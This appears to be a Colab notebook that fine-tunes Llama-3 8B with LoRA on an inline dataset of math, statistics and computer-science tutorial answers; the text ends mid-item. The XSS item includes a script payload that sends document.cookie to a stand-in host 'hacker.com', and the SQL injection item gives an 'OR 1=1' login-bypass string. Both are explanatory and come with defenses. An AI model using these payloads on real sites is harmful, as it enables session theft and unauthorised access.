# 🧠 AetherMind: AI Computational Assistant (Llama-3 Edition) 🚀

### Instructions:
1. Go to **Runtime -> Change runtime type -> T4 GPU**
2. Click **Runtime -> Run all**
3. Wait ~5 minutes. A public link will appear at the very bottom.
4. Paste that link into your Claude UI!

---

In [ ]:
# ============================================================
# STEP 1: Install Dependencies
# ============================================================
!pip install "unsloth[colab-new] @ git+https://github.com/unslothai/unsloth.git"
!pip install --no-deps xformers trl peft accelerate bitsandbytes
!pip install datasets gradio

In [ ]:
# ============================================================
# STEP 2: Load Llama-3 8B (4-bit quantized, fits on free T4)
# ============================================================
import os
import torch
from unsloth import FastLanguageModel

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name = "unsloth/llama-3-8b-Instruct-bnb-4bit",
    max_seq_length = 2048,
    load_in_4bit = True,
    dtype = None,
)
print("Model loaded successfully!")

In [ ]:
# ============================================================
# STEP 3: Setup LoRA for efficient fine-tuning
# ============================================================
model = FastLanguageModel.get_peft_model(
    model,
    r = 16,
    target_modules = ["q_proj", "k_proj", "v_proj", "o_proj",
                      "gate_proj", "up_proj", "down_proj"],
    lora_alpha = 16,
    lora_dropout = 0,
    bias = "none",
    use_gradient_checkpointing = "unsloth",
    random_state = 3407,
)
print("LoRA adapter attached!")

In [ ]:
# ============================================================
# STEP 4: Load the AetherMind Dataset
# ============================================================
import json
from datasets import Dataset
from unsloth.chat_templates import get_chat_template

# Apply the official Llama-3 chat template
tokenizer = get_chat_template(tokenizer, chat_template="llama-3")

# The AetherMind Indian AI Computational Assistant dataset
aethermind_data = [
  {
    "instruction": "Find the derivative of f(x) = x^2 * sin(x) using the product rule.",
    "input": "",
    "output": "To find the derivative of the function $f(x) = x^2 \\sin(x)$, we use the **Product Rule** of differentiation.\n\n### The Product Rule\nThe product rule states that if a function is the product of two functions, $u(x)$ and $v(x)$, then:\n$$ \\frac{d}{dx}[u(x)v(x)] = u'(x)v(x) + u(x)v'(x) $$\n\n### Step-by-Step Working\nLet's define $u(x)$ and $v(x)$:\n*   $u(x) = x^2$\n*   $v(x) = \\sin(x)$\n\n1.  **Differentiate $u(x)$** with respect to $x$:\n    $$ u'(x) = \\frac{d}{dx}[x^2] = 2x $$\n2.  **Differentiate $v(x)$** with respect to $x$:\n    $$ v'(x) = \\frac{d}{dx}[\\sin(x)] = \\cos(x) $$\n3.  **Combine the results** using the product rule formula:\n    $$ f'(x) = u'(x)v(x) + u(x)v'(x) $$\n    $$ f'(x) = (2x)(\\sin(x)) + (x^2)(\\cos(x)) $$\n    $$ f'(x) = 2x \\sin(x) + x^2 \\cos(x) $$\n\n### Final Answer\nThe derivative is:\n$$ f'(x) = 2x \\sin(x) + x^2 \\cos(x) $$\nThis formula gives the instantaneous slope or rate of change of $f(x)$ at any given $x$ coordinate.\n\n### Code Verification\nHere is how you can verify this derivative in Python using SymPy:\n```python\nimport sympy as sp\nx = sp.Symbol('x')\nf = x**2 * sp.sin(x)\ndf = sp.diff(f, x)\nprint(df) # Output: 2*x*sin(x) + x**2*cos(x)\n```"
  },
  {
    "instruction": "Find the determinant and inverse of the matrix A = [[2, 1], [1, 3]].",
    "input": "",
    "output": "Here is how to calculate the determinant and the inverse of the $2 \\times 2$ matrix $A = \\begin{pmatrix} 2 & 1 \\\\ 1 & 3 \\end{pmatrix}$.\n\n### Formulas for a $2 \\times 2$ Matrix\nFor a general $2 \\times 2$ matrix $M = \\begin{pmatrix} a & b \\\\ c & d \\end{pmatrix}$:\n*   **Determinant**: \n    $$ \\det(M) = ad - bc $$\n*   **Inverse**: \n    $$ M^{-1} = \\frac{1}{\\det(M)} \\begin{pmatrix} d & -b \\\\ -c & a \\end{pmatrix} \\quad \\text{(if } \\det(M) \\neq 0\\text{)} $$\n\n### 1. Calculate the Determinant\nSubstitute the values $a=2, b=1, c=1, d=3$ into the determinant formula:\n$$ \\det(A) = (2)(3) - (1)(1) = 6 - 1 = 5 $$\nSince $\\det(A) = 5 \\neq 0$, the matrix is non-singular and has a valid inverse.\n\n### 2. Construct the Inverse Matrix\nSwap the main diagonal elements ($2$ and $3$), negate the off-diagonal elements ($1$ and $1$), and multiply by the scalar $\\frac{1}{\\det(A)}$:\n$$ A^{-1} = \\frac{1}{5} \\begin{pmatrix} 3 & -1 \\\\ -1 & 2 \\end{pmatrix} = \\begin{pmatrix} 0.6 & -0.2 \\\\ -0.2 & 0.4 \\end{pmatrix} $$\n\n### Final Answer\n*   **Determinant**: $\\det(A) = 5$\n*   **Inverse Matrix**: \n    $$ A^{-1} = \\begin{pmatrix} 0.6 & -0.2 \\\\ -0.2 & 0.4 \\end{pmatrix} $$\n\nMultiplying $A$ by $A^{-1}$ yields the identity matrix $\\begin{pmatrix} 1 & 0 \\\\ 0 & 1 \\end{pmatrix}$.\n\n### Code Verification\nHere is the NumPy implementation for validation:\n```python\nimport numpy as np\nA = np.array([[2, 1], [1, 3]])\ndet = np.linalg.det(A)\ninv = np.linalg.inv(A)\nprint(f\"Det: {det:.1f}, Inv:\\n{inv}\")\n```"
  },
  {
    "instruction": "Calculate the greatest common divisor (GCD) of 48 and 18 using the Euclidean Algorithm.",
    "input": "",
    "output": "The **Euclidean Algorithm** is an efficient method for computing the greatest common divisor (GCD) of two integers $a$ and $b$ (where $a > b$). It is based on the mathematical principle that:\n$$ \\gcd(a, b) = \\gcd(b, a \\bmod b) $$\nWe repeat this division step recursively until the remainder is $0$. The last non-zero remainder is the GCD.\n\n### Step-by-Step Working\nLet $a = 48$ and $b = 18$.\n\n1.  **Divide $48$ by $18$**:\n    $$ 48 = 2 \\times 18 + 12 \\quad \\text{(Remainder } r_1 = 12\\text{)} $$\n    This means $\\gcd(48, 18) = \\gcd(18, 12)$.\n2.  **Divide $18$ by $12$**:\n    $$ 18 = 1 \\times 12 + 6 \\quad \\text{(Remainder } r_2 = 6\\text{)} $$\n    This means $\\gcd(18, 12) = \\gcd(12, 6)$.\n3.  **Divide $12$ by $6$**:\n    $$ 12 = 2 \\times 6 + 0 \\quad \\text{(Remainder } r_3 = 0\\text{)} $$\n    Since the remainder is now $0$, the algorithm terminates.\n\n### Final Answer\nThe Greatest Common Divisor of $48$ and $18$ is **$6$**.\n\n### Code Verification\nYou can compute this in Python using the built-in `math` module:\n```python\nimport math\ngcd_val = math.gcd(48, 18)\nprint(f\"GCD: {gcd_val}\") # Output: 6\n```"
  },
  {
    "instruction": "Find the roots of f(x) = x^2 - 5x + 6 using the Newton-Raphson numerical method.",
    "input": "",
    "output": "The **Newton-Raphson method** is an iterative numerical algorithm used to find real roots of a differentiable equation $f(x) = 0$. The update rule is:\n$$ x_{n+1} = x_n - \\frac{f(x_n)}{f'(x_n)} $$\nFor the function $f(x) = x^2 - 5x + 6$, the first derivative is:\n$$ f'(x) = 2x - 5 $$\n\n### Step-by-Step Iteration (Initial Guess $x_0 = 5$)\n\n*   **Iteration 1 ($n = 0$):**\n    *   Evaluate function: $f(5) = 5^2 - 5(5) + 6 = 6$\n    *   Evaluate derivative: $f'(5) = 2(5) - 5 = 5$\n    *   Compute next term: \n        $$ x_1 = 5 - \\frac{6}{5} = 3.8 $$\n\n*   **Iteration 2 ($n = 1$):**\n    *   Evaluate function: $f(3.8) = (3.8)^2 - 5(3.8) + 6 = 1.44$\n    *   Evaluate derivative: $f'(3.8) = 2(3.8) - 5 = 2.6$\n    *   Compute next term: \n        $$ x_2 = 3.8 - \\frac{1.44}{2.6} \\approx 3.2462 $$\n\n*   **Iteration 3 ($n = 2$):**\n    *   Evaluate function: $f(3.2462) \\approx (3.2462)^2 - 5(3.2462) + 6 \\approx 0.3013$\n    *   Evaluate derivative: $f'(3.2462) \\approx 2(3.2462) - 5 \\approx 1.4924$\n    *   Compute next term: \n        $$ x_3 = 3.2462 - \\frac{0.3013}{1.4924} \\approx 3.0443 $$\n\nFurther iterations converge rapidly to the exact root **$x = 3$**.\n\n### Code Verification\nHere is how you can perform this numerical optimization using SciPy:\n```python\nfrom scipy.optimize import newton\nf = lambda x: x**2 - 5*x + 6\nroot = newton(f, 5.0)\nprint(f\"Root: {root}\") # Output: 3.0\n```"
  },
  {
    "instruction": "Calculate the mean, variance, and standard deviation of the dataset: [4, 8, 6, 2, 10].",
    "input": "",
    "output": "To find the sample mean, sample variance, and sample standard deviation of the dataset $[4, 8, 6, 2, 10]$ ($N = 5$):\n\n### Formulas\n*   **Sample Mean ($\\bar{x}$)**:\n    $$ \\bar{x} = \\frac{\\sum_{i=1}^N x_i}{N} $$\n*   **Sample Variance ($s^2$)**:\n    $$ s^2 = \\frac{\\sum_{i=1}^N (x_i - \\bar{x})^2}{N - 1} $$\n*   **Sample Standard Deviation ($s$)**:\n    $$ s = \\sqrt{s^2} $$\n\n### Step-by-Step Calculation\n\n1.  **Calculate the Sample Mean ($\\bar{x}$)**:\n    $$ \\bar{x} = \\frac{4 + 8 + 6 + 2 + 10}{5} = \\frac{30}{5} = 6 $$\n2.  **Calculate the Squared Deviations**:\n    *   $(4 - 6)^2 = (-2)^2 = 4$\n    *   $(8 - 6)^2 = (2)^2 = 4$\n    *   $(6 - 6)^2 = (0)^2 = 0$\n    *   $(2 - 6)^2 = (-4)^2 = 16$\n    *   $(10 - 6)^2 = (4)^2 = 16$\n    *   Sum of squared deviations $= 4 + 4 + 0 + 16 + 16 = 40$\n3.  **Calculate the Sample Variance ($s^2$)**:\n    Using Bessel's correction ($N - 1 = 4$):\n    $$ s^2 = \\frac{40}{4} = 10 $$\n4.  **Calculate the Sample Standard Deviation ($s$)**:\n    $$ s = \\sqrt{10} \\approx 3.1623 $$\n\n### Final Answer\n*   **Mean ($\\bar{x}$)**: $6$\n*   **Variance ($s^2$)**: $10$\n*   **Standard Deviation ($s$)**: $3.1623$\n\n### Code Verification\nYou can compute these statistics using NumPy:\n```python\nimport numpy as np\ndata = [4, 8, 6, 2, 10]\nmean = np.mean(data)\nvar = np.var(data, ddof=1)\nstd = np.std(data, ddof=1)\nprint(f\"Mean: {mean}, Var: {var}, Std: {std:.4f}\")\n```"
  },
  {
    "instruction": "Explain and compute Bayes Theorem for a medical test scenario.",
    "input": "A disease affects 1% of the population. A test is 99% accurate (true positive rate) and has a 2% false positive rate. If a person tests positive, what is the probability they have the disease?",
    "output": "This scenario can be solved using **Bayes' Theorem**, which computes conditional probabilities by incorporating prior information.\n\n### Bayes' Theorem Formula\n$$ P(D|+) = \\frac{P(+|D)P(D)}{P(+)} $$\nWhere:\n*   $D$: Person has the disease.\n*   $H$: Person is healthy (no disease).\n*   $+$: Person tests positive.\n\n### Prior and Conditional Probabilities\n*   Prior probability of disease: $P(D) = 0.01$\n*   Prior probability of being healthy: $P(H) = 1 - P(D) = 0.99$\n*   True positive rate (Sensitivity): $P(+|D) = 0.99$\n*   False positive rate: $P(+|H) = 0.02$\n\n### Calculation Steps\n\n1.  **Calculate the overall probability of testing positive, $P(+)$**:\n    Using the Law of Total Probability:\n    $$ P(+) = P(+|D)P(D) + P(+|H)P(H) $$\n    $$ P(+) = (0.99 \\times 0.01) + (0.02 \\times 0.99) $$\n    $$ P(+) = 0.0099 + 0.0198 = 0.0297 $$\n\n2.  **Apply Bayes' Theorem**:\n    $$ P(D|+) = \\frac{P(+|D)P(D)}{P(+)} = \\frac{0.99 \\times 0.01}{0.0297} = \\frac{0.0099}{0.0297} = \\frac{1}{3} \\approx 33.33\\% $$\n\n### Explanation\nEven though the test has a very high sensitivity ($99\\%$), the disease base rate in the population is very low ($1\\%$). As a result, false positives outnumber true positives. If a person tests positive, there is only a **$33.33\\%$** chance they actually have the disease.\n\n### Code Verification\nHere is the Python calculation:\n```python\np_d = 0.01\np_pos_d = 0.99\np_pos_h = 0.02\np_pos = (p_pos_d * p_d) + (p_pos_h * (1 - p_d))\np_d_pos = (p_pos_d * p_d) / p_pos\nprint(f\"P(D|+): {p_d_pos:.4f}\") # Output: 0.3333\n```"
  },
  {
    "instruction": "Conduct a one-sample t-test on student scores.",
    "input": "Sample scores: [72, 75, 78, 69, 74]. Test whether the population mean is significantly different from 70.",
    "output": "To check if the average score differs significantly from $70$, we conduct a **One-Sample t-test**.\n\n### Hypotheses\n*   **Null Hypothesis ($H_0$)**: $\\mu = 70$ (Population mean is not different from 70)\n*   **Alternative Hypothesis ($H_1$)**: $\\mu \\neq 70$ (Population mean is different from 70)\n\n### Formula\n$$ t = \\frac{\\bar{x} - \\mu_0}{s / \\sqrt{n}} $$\nWhere $\\bar{x}$ is the sample mean, $s$ is the sample standard deviation, and $n$ is the sample size ($n=5$).\n\n### Step-by-Step Calculations\n\n1.  **Calculate the Sample Mean ($\\bar{x}$)**:\n    $$ \\bar{x} = \\frac{72+75+78+69+74}{5} = 73.6 $$\n2.  **Calculate the Sample Standard Deviation ($s$)**:\n    *   Deviations from mean: $[-1.6, 1.4, 4.4, -4.6, 0.4]$\n    *   Squared deviations: $[2.56, 1.96, 19.36, 21.16, 0.16]$\n    *   Sum of Squares ($SS$) $= 45.2$\n    *   Variance ($s^2$) $= 45.2 / (5 - 1) = 11.3$\n    *   Standard Deviation ($s$) $= \\sqrt{11.3} \\approx 3.3615$\n3.  **Compute the t-statistic**:\n    $$ t = \\frac{73.6 - 70}{3.3615 / \\sqrt{5}} = \\frac{3.6}{1.5033} \\approx 2.3947 $$\n\n### Conclusion\nFor degrees of freedom $df = n - 1 = 4$ and a two-tailed significance level $\\alpha = 0.05$, the critical t-value from the t-distribution table is **$2.776$**. \nSince calculated $|t| = 2.395 < 2.776$, we fail to reject the null hypothesis. There is not enough statistical evidence to conclude that the average student score is significantly different from $70$.\n\n### Code Verification\nHere is how to calculate this using SciPy:\n```python\nfrom scipy import stats\nscores = [72, 75, 78, 69, 74]\nt_stat, p_val = stats.ttest_1samp(scores, 70)\nprint(f\"t-statistic: {t_stat:.4f}, p-value: {p_val:.4f}\")\n```"
  },
  {
    "instruction": "Compute the PMF of a Binomial distribution for getting exactly 3 heads in 10 flips of a fair coin.",
    "input": "",
    "output": "We compute the probability of getting exactly $k$ successes in $n$ independent trials using the **Probability Mass Function (PMF)** of the Binomial distribution:\n$$ P(X = k) = \\binom{n}{k} p^k (1-p)^{n-k} $$\nWhere the binomial coefficient $\\binom{n}{k}$ is:\n$$ \\binom{n}{k} = \\frac{n!}{k!(n-k)!} $$\n\n### Parameters\n*   Number of coin flips ($n$) $= 10$\n*   Target number of heads ($k$) $= 3$\n*   Probability of heads ($p$) $= 0.5$\n\n### Step-by-Step Calculation\n\n1.  **Calculate the combination $\\binom{10}{3}$**:\n    $$ \\binom{10}{3} = \\frac{10!}{3!(10-3)!} = \\frac{10 \\times 9 \\times 8}{3 \\times 2 \\times 1} = 120 $$\n2.  **Evaluate the probability terms**:\n    *   $p^3 = (0.5)^3 = 0.125$\n    *   $(1-p)^{10-3} = (0.5)^7 = 0.0078125$\n3.  **Multiply together**:\n    $$ P(X = 3) = 120 \\times 0.125 \\times 0.0078125 = 0.1171875 \\quad (11.72\\%) $$\n\n### Final Answer\nThe probability of flipping exactly 3 heads in 10 flips of a fair coin is **$0.1172$** (or **$11.72\\%$**).\n\n### Code Verification\nYou can calculate this using SciPy's stats module:\n```python\nfrom scipy.stats import binom\nprob = binom.pmf(3, 10, 0.5)\nprint(f\"Binomial PMF: {prob:.6f}\") # Output: 0.117188\n```"
  },
  {
    "instruction": "Explain the Master Theorem in complexity analysis with an example.",
    "input": "",
    "output": "The **Master Theorem** is a mathematical tool used to determine the asymptotic complexity of divide-and-conquer recurrence relations of the form:\n$$ T(n) = a T\\left(\\frac{n}{b}\\right) + f(n) $$\nWhere $a \\geq 1$ is the number of subproblems, $b > 1$ is the division factor, and $f(n)$ is the work done outside recursive splits.\n\n### Recurrence Comparison Cases\nWe compare the function $f(n)$ with $n^{\\log_b a}$:\n*   **Case 1**: If $f(n) = O(n^{\\log_b a - \\epsilon})$ for some $\\epsilon > 0$, then: \n    $$ T(n) = \\Theta(n^{\\log_b a}) $$\n*   **Case 2**: If $f(n) = \\Theta(n^{\\log_b a})$, then: \n    $$ T(n) = \\Theta(n^{\\log_b a} \\log n) $$\n*   **Case 3**: If $f(n) = \\Omega(n^{\\log_b a + \\epsilon})$ for some $\\epsilon > 0$, and the regularity condition ($a f(n/b) \\leq c f(n)$) holds, then: \n    $$ T(n) = \\Theta(f(n)) $$\n\n### Example Walkthrough\nLet's solve the recurrence: \n$$ T(n) = 8 T\\left(\\frac{n}{2}\\right) + n^2 $$\nHere, we identify the parameters:\n*   $a = 8$ (8 subproblems)\n*   $b = 2$ (problem size is halved)\n*   $f(n) = n^2$ (combine/divide step runs in quadratic time)\n\n1.  **Calculate $n^{\\log_b a}$**:\n    $$ n^{\\log_2 8} = n^3 $$\n2.  **Compare $f(n)$ with $n^{\\log_b a}$**:\n    We compare $f(n) = n^2$ with $n^3$. Since $n^2 = O(n^{3 - 1})$ (with $\\epsilon = 1 > 0$), the recursive splits dominate the runtime.\n3.  **Identify the case and solution**:\n    This matches **Case 1**. Therefore, the asymptotic bound is:\n    $$ T(n) = \\Theta(n^3) $$\n\n### Real-world Application\nThe Master Theorem is standard for analyzing recurrences like **Merge Sort** ($T(n) = 2T(n/2) + O(n) \\rightarrow \\Theta(n \\log n)$) and **Binary Search** ($T(n) = T(n/2) + O(1) \\rightarrow \\Theta( \\log n)$)."
  },
  {
    "instruction": "Explain Process vs Thread scheduling in Operating Systems.",
    "input": "",
    "output": "In Operating Systems, **processes** and **threads** represent the fundamental execution context for running applications.\n\n### A Simple Analogy\nThink of a **Process** as a **Company** and a **Thread** as an **Employee** working in that company. A company (process) has private resources (office building, mail box, business license). Employees (threads) share these company resources (workspace, database access), but each employee has their own private workspace desk, notebook, and task list (registers, stack, program counter).\n\n### Key Differences\n\n*   **Memory and Resources**:\n    *   **Process**: Allocated its own private address space, heap, file descriptors, and environment variables. Context switching between different processes is expensive because the CPU must load new page tables (MMU updates, flushing Translation Lookaside Buffer caches).\n    *   **Thread**: Shares memory space (heap, code segment, static variables) with all other threads in the parent process. It only maintains a private stack, program counter (PC), and registers. Thread context switching is lightweight since page table mappings remain unchanged.\n*   **Isolation and Security**:\n    *   **Process**: High isolation. A crash in one process does not affect others.\n    *   **Thread**: Low isolation. Since threads share memory, a memory corruption or exception in one thread can crash the entire parent process.\n*   **Scheduling**:\n    *   The kernel scheduler schedules threads (thread-level scheduling is standard in modern OSes). However, if threads are user-level, they are scheduled by a runtime library, whereas kernel-level threads are scheduled directly by the OS kernel."
  },
  {
    "instruction": "What are database transactions and ACID properties?",
    "input": "",
    "output": "A **database transaction** is a logical sequence of operations (reads and writes) performed as a single unit of work. To maintain database integrity and handle concurrent access, database management systems enforce the **ACID** properties.\n\n### The ACID Properties\n\n*   **Atomicity (All-or-Nothing)**:\n    Either all operations of the transaction commit successfully, or the entire transaction is rolled back, leaving the database unchanged.\n*   **Consistency (State Validity)**:\n    A transaction must transition the database from one valid state to another, preserving all integrity constraints (primary keys, foreign keys, constraints).\n*   **Isolation (Concurrency Protection)**:\n    Multiple transactions executing concurrently must not interfere with each other. The database state should be identical to the state obtained if the transactions executed sequentially.\n*   **Durability (Persistence)**:\n    Once a transaction commits, the changes are permanent and survive any subsequent power failure or system crash, usually guaranteed by writing transaction logs to non-volatile storage (Write-Ahead Logging).\n\n### Transaction Example (SQL)\nFor a bank transfer of $100 from Account A to Account B:\n```sql\nBEGIN TRANSACTION;\nUPDATE accounts SET balance = balance - 100 WHERE id = 'A';\nUPDATE accounts SET balance = balance + 100 WHERE id = 'B';\nCOMMIT;\n```\nIf the system crashes after the first UPDATE but before the second, the database uses its logs to perform a **rollback**, reversing the deduction from Account A."
  },
  {
    "instruction": "Explain the difference between TCP and UDP protocols in Computer Networking.",
    "input": "",
    "output": "Both **TCP (Transmission Control Protocol)** and **UDP (User Datagram Protocol)** operate at the transport layer of the internet suite, but they serve different networking requirements.\n\n### A Simple Analogy\n*   **TCP** is like a **registered letter**. The post office tracks the delivery, confirms it has arrived, resends it if lost, and delivers it in the exact order it was sent.\n*   **UDP** is like a **postcard**. You send it quickly with low overhead, but you have no confirmation of arrival, and it could get lost or arrive out of sequence.\n\n### Comparison Table\n| Feature | TCP | UDP |\n| :--- | :--- | :--- |\n| **Connection** | Connection-oriented (uses 3-way handshake) | Connectionless (sends immediately) |\n| **Reliability** | Reliable (retransmits lost data) | Unreliable (best-effort, no tracking) |\n| **Ordering** | Guarantees packets arrive in sequence | Packets can arrive out of order |\n| **Flow Control** | Yes (adjusts speed to avoid congestion) | No (sends data at maximum speed) |\n| **Header Size** | 20 to 60 bytes | 8 bytes |\n\n### Use Cases\n*   **Use TCP** when data completeness is critical: Web browsing (HTTP/HTTPS), Email (SMTP), File transfer (FTP/SFTP).\n*   **Use UDP** when speed is critical and minor packet loss is acceptable: Live video streaming (VoIP, video calls), DNS requests, Online gaming."
  },
  {
    "instruction": "Implement a binary search algorithm in Python.",
    "input": "Search target 7 in array [1, 3, 5, 7, 9, 11]",
    "output": "To find a target value in a sorted array, the **Binary Search** algorithm divides the search space in half at each step. This achieves logarithmic time complexity.\n\n### Python Implementation\n```python\ndef binary_search(arr, target):\n    low = 0\n    high = len(arr) - 1\n    \n    while low <= high:\n        # Calculate mid, avoiding potential integer overflow\n        mid = low + (high - low) // 2\n        current = arr[mid]\n        \n        # Target found\n        if current == target:\n            return mid\n        # Target is in the left half\n        elif current > target:\n            high = mid - 1\n        # Target is in the right half\n        else:\n            low = mid + 1\n            \n    # Target is not in the array\n    return -1\n```\n\n### Trace with Input: `arr = [1, 3, 5, 7, 9, 11]`, `target = 7`\n1.  **Initial State**: `low = 0`, `high = 5`\n2.  **Step 1**:\n    *   `mid = 0 + (5 - 0) // 2 = 2`\n    *   `arr[2] = 5`\n    *   Since $5 < 7$, search the right half: `low = mid + 1 = 3`\n3.  **Step 2**:\n    *   `mid = 3 + (5 - 3) // 2 = 4`\n    *   `arr[4] = 9`\n    *   Since $9 > 7$, search the left half: `high = mid - 1 = 3`\n4.  **Step 3**:\n    *   `mid = 3 + (3 - 3) // 2 = 3`\n    *   `arr[3] = 7`\n    *   Since $7 == 7$, index `3` is returned.\n\n### Complexity\n*   **Time Complexity**: $O(\\log n)$ because the size of the search array is halved at each step.\n*   **Space Complexity**: $O(1)$ auxiliary memory since it operates iteratively."
  },
  {
    "instruction": "Reverse a Singly Linked List in JavaScript.",
    "input": "",
    "output": "To reverse a singly linked list in-place, we traverse the list and change each node's `next` pointer to point to its predecessor instead of its successor.\n\n### JavaScript Implementation\n```javascript\nfunction reverseList(head) {\n    let prev = null;\n    let curr = head;\n    \n    while (curr !== null) {\n        // Store the next node temporarily\n        let nextTemp = curr.next;\n        \n        // Reverse the pointer\n        curr.next = prev;\n        \n        // Advance pointers forward\n        prev = curr;\n        curr = nextTemp;\n    }\n    \n    // 'prev' is now the new head node\n    return prev;\n}\n```\n\n### Algorithm Visualization\nFor a list: $1 \\rightarrow 2 \\rightarrow 3 \\rightarrow \\text{null}$\n*   **Start**: `curr = 1`, `prev = null`\n*   **Step 1**: Reverse link $1 \\rightarrow \\text{null}$. Move `prev = 1`, `curr = 2`\n*   **Step 2**: Reverse link $2 \\rightarrow 1$. Move `prev = 2`, `curr = 3`\n*   **Step 3**: Reverse link $3 \\rightarrow 2$. Move `prev = 3`, `curr = null`\n*   **End**: Returns `prev` (node 3) as the new head: $3 \\rightarrow 2 \\rightarrow 1 \\rightarrow \\text{null}$.\n\n### Complexity\n*   **Time Complexity**: $O(n)$ where $n$ is the list length.\n*   **Space Complexity**: $O(1)$ auxiliary space as we modify pointers in-place."
  },
  {
    "instruction": "Write a C program to demonstrate memory allocation and pointers.",
    "input": "",
    "output": "In C, dynamic memory allocation allows programs to request heap memory at runtime. This memory is managed using pointers and must be explicitly released.\n\n### C Implementation\n```c\n#include <stdio.h>\n#include <stdlib.h>\n\nint main() {\n    int n = 5;\n    // Request heap space for 5 integers\n    int *arr = (int *)malloc(n * sizeof(int));\n    \n    // Check if allocation was successful\n    if (arr == NULL) {\n        printf(\"Memory allocation failed!\\n\");\n        return 1;\n    }\n    \n    // Initialize memory using pointer arithmetic\n    for (int i = 0; i < n; i++) {\n        *(arr + i) = (i + 1) * 10;\n    }\n    \n    // Display values\n    for (int i = 0; i < n; i++) {\n        printf(\"Element %d: %d\\n\", i, arr[i]);\n    }\n    \n    // Free the allocated memory to prevent leaks\n    free(arr);\n    arr = NULL; // Avoid dangling pointer references\n    \n    return 0;\n}\n```\n\n### Key Concepts\n*   `malloc`: Allocates a specified number of bytes and returns a generic pointer (`void*`).\n*   `free`: Releases the heap memory back to the operating system.\n*   `*(arr + i)`: Equivalent to the array notation `arr[i]`, highlighting pointer arithmetic."
  },
  {
    "instruction": "Explain Cross-Site Scripting (XSS) in Web Security.",
    "input": "",
    "output": "**Cross-Site Scripting (XSS)** is a security vulnerability where an attacker injects malicious client-side script code (typically JavaScript) into a trusted website, which is then executed by a victim's browser.\n\n### A Simple Analogy\nImagine a public bulletin board at a local store where anyone can pin paper notes. An attacker pins a note with a chemical dye that rubs off on the hands of anyone who reads it. Similarly, XSS occurs when a website displays text inputs containing hidden code, affecting visitors who view the page.\n\n### Vulnerable Example (Reflected XSS)\nIf a search application takes input from the URL parameters and outputs it directly into the HTML without sanitization:\n```html\n<!-- URL: http://example.com/search?q=<script>fetch('http://hacker.com/steal?cookie='+document.cookie)</script> -->\n<div>Search results for: <span id=\"query\"></span></div>\n\n<script>\n  const queryParam = new URLSearchParams(window.location.search).get('q');\n  document.getElementById('query').innerHTML = queryParam; // Vulnerable!\n</script>\n```\nBecause `innerHTML` parses scripts, the visitor's browser executes the attacker's script, sending their session cookies to the external hacker server.\n\n### Defensive Countermeasures\n1.  **Output Encoding**: Convert characters like `<` and `>` into safe HTML entities (e.g. `&lt;` and `&gt;`).\n2.  **Content Security Policy (CSP)**: Set HTTP response headers specifying restriction rules on script load sources.\n3.  **HttpOnly Flags**: Set the `HttpOnly` cookie flag on session IDs, blocking client-side JavaScript access."
  },
  {
    "instruction": "Explain SQL Injection (SQLi) vulnerabilities.",
    "input": "",
    "output": "**SQL Injection (SQLi)** is a web vulnerability where an attacker injects malicious database statements into application inputs, altering the query logic executed by the database.\n\n### A Simple Analogy\nImagine a bank cheque where you write your name. In the name box, you write: `\"John Doe AND transfer all vaults to me\"`. If the teller processes that string literally as commands, they have been exploited. SQLi operates similarly when database scripts concatenate string parameters directly into database queries.\n\n### Vulnerable Database Query\nIf backend authentication concatenates user input strings directly:\n```python\n# Vulnerable Python SQL query concatenation\nquery = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\ncursor.execute(query)\n```\nIf an attacker inputs `admin' OR '1'='1` as the username, the statement evaluates to:\n```sql\nSELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = '...'\n```\nSince `'1'='1'` is always true, the login is bypassed and access is granted without checking the password.\n\n### Defensive Countermeasure (Prepared Statements)\nTo prevent SQL Injection, use **Parameterized Queries (Prepared Statements)**. The parameters are sent separately from the SQL statement template, ensuring the SQL driver treats inputs strictly as literal values rather than executable code:\n```python\n# Secure parameterization\nquery = \"SELECT * FROM users WHERE username = ? AND password = ?\"\ncursor.execute(query, (username, password))\n```"
  },
  {
    "instruction": "Explain Symmetric Cryptography vs Asymmetric Cryptography.",
    "input": "",
    "output": "Cryptography securing digital systems uses two main encryption schemes: **Symmetric** and **Asymmetric**.\n\n### A Simple Analogy\n*   **Symmetric**: Like locking a chest with a key. You lock the chest and send it to a friend. For your friend to open it, you must mail them a duplicate physical key. If someone steals the key in transit, they can open the chest.\n*   **Asymmetric**: Your friend sends you an open padlock but keeps the key. You place your letter in the box, snap your friend's padlock shut, and send it back. Only your friend has the private key required to open it.\n\n### Technical Comparison\n*   **Symmetric Cryptography**:\n    *   **Keys**: Uses a single shared key for both encryption and decryption.\n    *   **Algorithms**: AES, ChaCha20.\n    *   **Speed**: Extremely fast, suitable for large data payloads.\n    *   **Issue**: Secure key distribution is difficult.\n*   **Asymmetric Cryptography**:\n    *   **Keys**: Uses a mathematically linked key pair: a public key (to encrypt) and a private key (to decrypt).\n    *   **Algorithms**: RSA, ECC (Elliptic Curve Cryptography).\n    *   **Speed**: Slower due to complex mathematics (modular exponentiation).\n    *   **Advantage**: Solves key distribution (public keys are safe to share globally).\n\n### Hybrid Cryptography\nReal-world systems (like HTTPS/TLS) combine both: they use Asymmetric encryption for the initial handshake to exchange a temporary symmetric key, and then use Symmetric encryption to transfer the session data."
  },
  {
    "instruction": "Build a responsive simple dashboard landing page layout.",
    "input": "",
    "output": "Here is a clean, modern, and responsive HTML/CSS dashboard grid layout. It includes a sidebar navigation, header status bar, and statistics metrics cards that stack vertically on mobile viewports.\n\n### HTML and CSS Code\n```html\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n  <meta charset=\"UTF-8\">\n  <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n  <title>Responsive Dashboard</title>\n  <style>\n    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', system-ui, sans-serif; }\n    body { display: flex; height: 100vh; background-color: #f8fafc; color: #1e293b; }\n    .sidebar { width: 240px; background-color: #0f172a; color: white; padding: 24px; display: flex; flex-direction: column; gap: 16px; }\n    .sidebar h2 { font-size: 20px; font-weight: 700; margin-bottom: 8px; }\n    .sidebar nav { font-size: 15px; color: #94a3b8; cursor: pointer; padding: 4px 0; }\n    .sidebar nav:hover { color: white; }\n    .main { flex: 1; display: flex; flex-direction: column; overflow-y: auto; }\n    header { background-color: white; border-bottom: 1px solid #e2e8f0; padding: 16px 24px; display: flex; justify-content: space-between; align-items: center; }\n    .content { padding: 24px; display: flex; flex-direction: column; gap: 24px; }\n    .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 